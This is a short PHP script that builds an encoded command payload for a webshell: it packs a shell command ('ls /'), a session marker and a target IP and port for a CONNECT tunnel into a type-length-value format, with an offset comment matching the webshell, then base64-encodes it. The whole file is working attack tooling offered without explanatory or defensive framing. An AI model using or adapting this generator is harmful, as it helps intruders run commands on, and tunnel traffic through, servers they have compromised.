<?php
function blv_encode($info) {
    $data = "";
    foreach ($info as $b => $v) {
        $l = strlen($v) + 5; // Match BLV_L_OFFSET in webshell
        $data .= pack("c1N1", $b, $l) . $v;
    }
    return $data;
}

$en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

$payload = [
    2 => "ls /", // CMD
    3 => "mark123",  // MARK (unique identifier for session)
    6 => "192.168.45.139", // Target IP (for CONNECT case)
    7 => "12345",      // Port (for CONNECT case)
];

$encoded = base64_encode(blv_encode($payload));
$encoded = strtr($encoded, "+/", "-_");

echo "Payload: " . $encoded . "\n";
?>
